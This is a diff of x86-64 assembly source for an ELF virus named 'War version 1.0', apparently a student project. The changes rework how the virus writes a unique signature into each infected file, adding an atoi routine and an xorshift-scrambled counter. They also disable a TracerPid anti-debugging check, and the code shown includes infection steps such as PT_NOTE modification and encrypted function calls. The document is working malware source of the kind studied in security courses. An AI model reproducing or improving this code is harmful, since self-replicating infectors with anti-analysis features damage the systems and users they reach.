@@ -178,84 +178,81 @@ section .text
         ret
     __F_mmap__end:
 
+    __F_atoi:
+      ; rax = resultado
+      .str_to_int:
+          xor rax, rax
+      .loop:
+          movzx rcx, byte [rsi]   ; cargar caracter
+          test rcx, rcx           ; ¿fin de string?
+          jz .done
+          sub rcx, '0'            ; convertir ASCII a número
+          imul rax, rax, 10       ; resultado *= 10
+          add rax, rcx            ; resultado += digito
+          inc rsi                 ; siguiente caracter
+          jmp .loop
+      .done:
+          ret
+    __F_atoi__end:
+
     __F_set_unique_trace:
-        push rax
-        push rbx
-        push rcx
-        push rdx
-        push rdi
-        push rsi
-        mov rax, SC_GETTIME
-        mov rdi, 0
-        lea rsi, VAR(War.ts)
-        syscall
-        mov rax, VAR(War.ts)
-        mov rdi, 0x1e9
-        mul rdi
-        xor rcx, rcx
-        lea rdi, [rel Traza + 47]
-        .convert:
-            xor rdx, rdx        ; limpiar rdx
-            mov rbx, 10
-            div rbx             ; rax = rax / 10
-                                ; rdx = resto
-            add dl, '0'         ; convertir a ASCII
-           push rdx            ; guardar dígito en stack
-            inc rcx
-            test rax, rax
-            jnz .convert
-        .write_loop:
-            pop rax
-            mov [rdi], al
-            inc rdi
-            loop .write_loop            
+      ; rax = integer from atoi(signature)
+      ; primero que todo, sumamos 1 al valor del contador.
+      inc rax
+      ; lo transformamos haciendo paranoias
+      mov rcx, rax
+      shl rcx, 13
+      xor rax, rcx
 
-        pop rsi
-        pop rdi
-        pop rdx
-        pop rcx
-        pop rbx
-        pop rax
-        ret
+      mov rcx, rax
+      shr rcx, 17
+      xor rax, rcx
+
+      mov rcx, rax
+      shl rcx, 5
+      xor rax, rcx
+
+	  ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
+      and rax, 0x3FFFFFF
+
+      ; rdi = buf
+      ; destruye: rax, rbx, rdx, rcx
+      lea rdi, [rel Traza]
+      add rdi, Traza_len + 1
+      add rdi, 8
+
+      ; rcx = contador (para escribir 8 bytes exactos)
+      ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
+      ; no al principio. Es porque escribimos del final al principio.
+      xor rcx, rcx
+      sub rsp, 8
+      lea rsi, [rsp+7]
+
+      mov rcx, 8
+      mov rbx, 10
+      .convert_loop:
+
+        ; rax = numerete
+        xor rdx, rdx
+        div rbx       ; rax / rbx. rdx = resto.
+
+        add dl, '0'
+        mov [rsi], dl
+        dec rsi
+
+        dec rcx
+        jnz .convert_loop
+
+      lea rsi, [rsp]
+      lea rdi, [rel Traza]
+      add rdi, Traza_len + 1
+      mov rcx, 8
+      cld
+      rep movsb
+
+      add rsp, 8
+      ret
     __F_set_unique_trace__end:
-
-    __F_set_unique_trace2:
-        sub rsp, 12
-        lea rdi, [rsp]
-        mov rsi, 12
-        mov rdx, 0x01
-        mov rax, SC_GETRANDOM
-        syscall
-
-        ; rdi = buf
-        ; destruye: rax, rbx, rdx, rcx
-
-        xor rcx, rcx          ; i = 0
-        .convert_loop:
-            cmp rcx, 12
-            je .write_signature
-
-            movzx eax, byte [rdi + rcx]
-            xor edx, edx
-            mov ebx, 10
-            div ebx        ; rax / 10 => deja en dl el residuo => mod 10
-            add dl, '0'
-            mov [rdi + rcx], dl
-
-            inc rcx
-            jmp .convert_loop
-
-            ; rdi = 65137838234
-        .write_signature:
-            mov rax, rdi
-            lea rdi, [rel Traza + 47]
-            mov rsi, rax
-            mov rcx, 12
-            cld
-            rep movsb
-        add rsp, 12
-        ret
-    __F_set_unique_trace2__end:
 
 
 ; ----------------------------------------------------------------------------------------------------------------------
@@ -448,8 +445,8 @@ section .text
     .check_tracerPid_value:
         ; Comentar estas 2 líneas para debug con gdb
 
-       cmp byte [rdi], 0x30 ; == "0"
-       jne .cleanup_and_jump_to_host_1
+       ; cmp byte [rdi], 0x30 ; == "0"
+       ; jne .cleanup_and_jump_to_host_1
 
     .close_status_file_and_infect:
         add rsp, 0x1000
@@ -655,7 +652,12 @@ section .text
         jnz .munmap
         
     .unique_trace:
-        CALL_ENCRYPT(set_unique_trace2)
+        xor rax, rax
+        lea rsi, [rel Traza]
+        add rsi, Traza_len + 1
+        CALL_ENCRYPT(atoi)
+        ; rax = el valor del contador que setea la signature
+        CALL_ENCRYPT(set_unique_trace)
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
@@ -748,8 +750,8 @@ section .text
     __F_data__end:
     Traza_position  equ     _finish - Traza
     fix_char        db      0
-    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo 000000000001",0  ;46
-    Traza_len       equ     $ - Traza - 1 - 12 - 1
+    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo 00000000",0  ;46
+    Traza_len       equ     $ - Traza - 1 - 8 - 1
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
